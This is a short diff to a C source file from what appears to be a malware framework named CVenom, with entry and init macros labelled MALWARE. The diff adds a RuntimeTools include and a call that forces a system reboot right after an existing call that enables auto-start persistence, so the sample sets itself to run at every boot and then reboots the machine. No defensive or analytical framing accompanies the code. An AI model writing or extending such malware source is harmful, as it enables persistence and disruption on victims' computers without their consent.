@@ -1,5 +1,6 @@
 #include "../../CVenom.h"
 #include "../../DominationTools.h"
+#include "../../RuntimeTools.h"
 
 int main(MALWARE_ENTRY){
 	cvinit(MALWARE_INIT);
@@ -9,7 +10,10 @@ int main(MALWARE_ENTRY){
 
 
 	DominationTools Dom;
+	RuntimeTools	Run;
+
 	Dom.EnableAutoStart();
+	Run.SystemExecute("reboot");
 
 	cvexit(MALWARE_EXIT);
 }
